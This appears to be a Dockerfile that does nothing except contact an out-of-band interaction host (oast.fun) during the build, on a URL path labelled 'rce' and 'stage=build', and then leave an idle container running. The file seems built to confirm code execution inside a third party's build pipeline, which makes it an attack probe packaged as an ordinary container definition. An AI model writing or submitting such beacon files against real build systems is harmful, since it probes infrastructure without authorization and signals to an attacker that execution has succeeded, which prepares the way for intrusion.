FROM alpine:3.20
RUN wget -q "https://xutancqqtyjpdybieeskc61dkng47ftdv.oast.fun/rce?stage=build" -O /dev/null
CMD ["sh", "-c", "while true; do sleep 3600; done"]
